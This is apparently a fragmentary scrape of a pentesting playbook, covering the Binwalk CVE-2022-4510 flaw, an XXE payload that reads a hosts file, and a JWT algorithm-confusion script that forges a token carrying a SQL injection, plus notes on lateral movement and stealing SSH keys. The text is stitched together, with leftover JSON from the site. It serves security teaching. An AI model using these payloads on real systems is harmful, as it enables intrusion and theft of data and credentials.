This looks promising...  From the very same github page of the project, there's a security warning:  Prior to Binwalk v2.3.3, extracted archives could create symlinks which point anywhere on the file system, potentially resulting in a directory traversal attack if subsequent extraction utilties blindly follow these symlinks. More generically, Binwalk makes use of many third-party extraction utilties which may have unpatched security issues; Binwalk v2.3.3 and later allows external extraction tools to be run as an unprivileged user using the run-as command line option (this requires Binwalk itself to be run with root privileges). Additionally, Binwalk v2.3.3 and later will refuse to perform extraction as root unless --run-as=root is specified.   Here we are dealing with binwalk v2.3.2, so it contains this vulnerability.  More details about the vulnerability:  https://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/https://github.com/electr0sm0g/CVE-2022-4510  The idea is to generate the payload to open a connection and upload it via SCP with the emily user. If we upload it via the web it will not open the connection since the image generated by convert, will not have the malicious payload to abuse binwalk.

This attack works because the XML parsers usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.  In order to check if the machine is vulnerable to this attack, you can try to show the contents of /etc/hosts(Linux) or C:/Windows/System32/drivers/etc/hosts(Windows). e.g.:  &lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot; &gt;]&gt; &lt;order&gt;&lt;quantity&gt;2&lt;/quantity&gt;&lt;item&gt;&amp;xxe;&lt;/item&gt;&lt;address&gt;Fake street 1234&lt;/address&gt;&lt;/order&gt;   ","version":"Next","tagName":"h3"},{"title":"JWT Key confussion attack​","type":1,"pageTitle":"Pentesting","url":"/docs/playbooks/pentesting#jwt-key-confussion-attack","content":" JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc...  They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.  This signing and verifing is very important because it ensures that nobody modifies the tokens.  However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we're using symmetric algorithm.  See the following example:  In the received side, the token is verified using symmetric and asymmetric algorithms:  async decode(token) { return (await jwt.verify(token, publicKey, { algorithms: ['RS256', 'HS256'] })); }   First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.  This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:  const fs = require('fs'); const jwt = require('jsonwebtoken'); const publicKey = fs.readFileSync('./public.key', 'utf8'); const validJwtToken = fs.readFileSync('./jwt-token.txt', 'utf8'); decoded = jwt.verify(validJwtToken, publicKey, { algorithms: [&quot;RS256&quot;]}) decoded[&quot;username&quot;] = &quot;admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage -- -&quot; re_encoded = jwt.sign(decoded, publicKey, {algorithm: 'HS256'}) console.log(re_encoded)   Here, we are using the public key to verify the received token, as the regular way.  Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the receiver will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.  In this case, we are modifying the token to retrieve something from the database using an SQL injection.

That's called lateral movement and it's a step forward privilege escalation.  Also part of lateral movement is to use the machine as a pivot to enumerate more network devices. Typically this is done for enterprise level pentesting. Once a machine is compromised, you can access the machines in the same network even if they don't have public access.  Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user.
